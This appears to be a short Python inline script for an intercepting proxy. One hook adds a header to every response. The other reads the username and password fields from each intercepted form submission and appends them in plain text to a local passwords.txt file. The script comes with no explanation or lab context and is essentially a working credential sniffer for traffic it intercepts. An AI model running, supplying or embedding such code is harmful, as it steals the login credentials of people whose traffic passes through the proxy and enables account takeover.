
def response(context, flow):
    res = flow.response
    #    print "!!!!!!!! %s !!!!!!!!!!" % (flow.response.headers["username"])
    flow.response.headers["newheader"] = ["foo"]

def request(context, flow):
    req = flow.request
    #print(req._assemble());
    #    print "!!!!!!!! %s @@@@@@@@@@" % (flow.request.headers["username"])
    if "application/x-www-form-urlencoded" in flow.request.headers["content-type"]:
        form = flow.request.get_form_urlencoded()
        #flow.request.set_form_urlencoded(form)
        with open("passwords.txt", "a") as myfile:
            myfile.write("Got user %s and passwod %s \n" % (form["username"],form["password"]))
        #print "!!!! Got user %s and passwod %s " % (form["username"],form["password"])
